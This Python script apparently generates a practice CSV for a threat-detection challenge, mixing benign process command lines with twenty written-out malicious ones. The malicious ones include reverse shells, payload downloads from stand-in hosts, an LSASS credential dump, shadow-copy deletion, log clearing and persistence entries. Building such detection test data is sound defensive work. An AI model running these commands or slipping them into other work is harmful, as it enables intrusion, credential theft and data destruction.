"""
generate_sample.py — build a realistic practice CSV for the challenge.

Writes sample.csv with EXACTLY 20 malicious rows + 200 benign background-noise
rows (220 total), shuffled deterministically. Used to verify the engine cleanly
separates the 20 threats from the noise.
"""

import csv
import random

random.seed(1337)  # deterministic — Math.random/Date are intentionally avoided

# --- 20 malicious commands spanning LOLBAS / GTFOBins / Sigma / MITRE ------- #
MALICIOUS = [
    ("certutil.exe", r"certutil.exe -urlcache -split -f http://185.23.44.9/payload.exe C:\Users\Public\p.exe"),
    ("powershell.exe", r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
    ("powershell.exe", r"powershell -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.io/a.ps1')"),
    ("mshta.exe", r"mshta.exe javascript:a=GetObject('script:http://evil.io/x.sct').Exec();close();"),
    ("regsvr32.exe", r"regsvr32.exe /s /n /u /i:http://evil.io/file.sct scrobj.dll"),
    ("rundll32.exe", r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell")'),
    ("schtasks.exe", r"schtasks /create /sc minute /mo 1 /tn UpdaterTask /tr C:\Users\Public\bd.exe /f"),
    ("wmic.exe", r"wmic /node:10.0.0.5 process call create cmd.exe /c powershell -enc ZQB2AGkAbAA="),
    ("vssadmin.exe", r"vssadmin delete shadows /all /quiet"),
    ("bitsadmin.exe", r"bitsadmin /transfer job /download /priority high http://evil.io/m.exe C:\Temp\m.exe"),
    ("cmd.exe", r'cmd.exe /c "^s^e^t^ ^x^=^p^o^w^e^r^s^h^e^l^l^&^&^!^x^! -nop -w hidden -c iex(iwr http://a.io)"'),
    ("rundll32.exe", r"rundll32.exe C:\windows\temp\evil.dll,DllMain comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full"),
    ("reg.exe", r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d C:\Users\Public\bd.exe /f"),
    ("awk", r"""awk 'BEGIN {system("/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1")}'"""),
    ("python3", r"""python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'"""),
    ("bash", r"bash -c 'exec 5<>/dev/tcp/10.0.0.5/4444; cat <&5 | while read l; do $l 2>&5 >&5; done'"),
    ("nc", r"nc -e /bin/sh 10.0.0.5 4444"),
    ("powershell.exe", r"powershell.exe -w hidden -nop -c $b=[Convert]::FromBase64String('aQBlAHgA');iex([Text.Encoding]::Unicode.GetString($b))"),
    ("wevtutil.exe", r"wevtutil cl Security && wevtutil cl System && wevtutil cl Application"),
    ("perl", r"""perl -e 'use Socket;$i="10.0.0.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exec("/bin/sh -i");'"""),
]

# --- benign background noise templates -------------------------------------- #
BENIGN = [
    ("svchost.exe", r"C:\Windows\System32\svchost.exe -k netsvcs -p"),
    ("explorer.exe", r"C:\Windows\Explorer.EXE"),
    ("chrome.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer'),
    ("Code.exe", r'"C:\Program Files\Microsoft VS Code\Code.exe" --no-sandbox'),
    ("python.exe", r"C:\Python311\python.exe manage.py runserver 0.0.0.0:8000"),
    ("git.exe", r'"C:\Program Files\Git\cmd\git.exe" status'),
    ("node.exe", r'"C:\Program Files\nodejs\node.exe" server.js'),
    ("OUTLOOK.EXE", r'"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"'),
    ("Teams.exe", r"C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe"),
    ("MsMpEng.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe"),
    ("certutil.exe", r"certutil.exe -? "),
    ("certutil.exe", r"C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256"),
    ("schtasks.exe", r"schtasks /query /fo table"),
    ("reg.exe", r"reg query HKLM\Software\Microsoft\Windows /s"),
    ("ipconfig.exe", r"C:\Windows\System32\ipconfig.exe /all"),
    ("net.exe", r"net use Z: \\fileserver\share"),
    ("cmd.exe", r"cmd.exe /c dir C:\Users\jdoe\Documents"),
    ("powershell.exe", r"powershell.exe Get-Process | Sort-Object CPU"),
    ("powershell.exe", r"powershell.exe -Command Get-Service -Name Spooler"),
    ("bash", r"bash -c 'ls -la /var/log'"),
    ("python3", r"python3 /opt/app/worker.py --config /etc/app/conf.yaml"),
    ("awk", r"""awk '{print $1}' /var/log/syslog"""),
    ("sshd", r"/usr/sbin/sshd -D"),
    ("nginx", r"nginx -g 'daemon off;'"),
    ("java", r"/usr/bin/java -Xmx2g -jar /opt/app/service.jar"),
    ("docker", r"docker ps --format '{{.Names}}'"),
    ("rundll32.exe", r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL"),
    ("wmic.exe", r"wmic logicaldisk get caption"),
    ("conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0x4"),
    ("RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe -Embedding"),
]


def main():
    rows = list(MALICIOUS)
    i = 0
    while len(rows) < 220:
        proc, cmd = BENIGN[i % len(BENIGN)]
        # light variation so rows aren't identical
        rows.append((proc, cmd + (f"  # session {i}" if i % 4 == 0 else "")))
        i += 1
    random.shuffle(rows)

    with open("sample.csv", "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(["process_name", "command_line"])
        w.writerows(rows)
    print(f"wrote sample.csv — {len(rows)} rows ({len(MALICIOUS)} malicious)")


if __name__ == "__main__":
    main()
